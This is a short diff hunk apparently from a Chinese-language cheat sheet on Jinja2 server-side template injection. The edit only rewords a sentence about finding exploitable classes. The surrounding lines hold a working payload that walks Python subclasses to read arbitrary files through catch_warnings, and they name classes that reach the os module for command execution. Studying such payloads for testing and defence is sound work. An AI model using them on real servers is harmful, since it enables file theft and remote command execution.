@@ -125,7 +125,7 @@ your input object基类的子类
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
 ```
 
-若经过{{''.__class__.__base__.__subclasses__()}}查询存在的类和位置后，可以借助的类反射调用方法：
+若经过{{''.__class__.__base__.__subclasses__()}}，用工具或手工查询存在的利用类和位置后，可以借助的类反射调用方法：
 ```
 <class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。可以导入后命令执行。
 <class 'site._Printer'> 内含os模块（不需要import os） ，可能在第71位，可以借助这些类来执行命令。
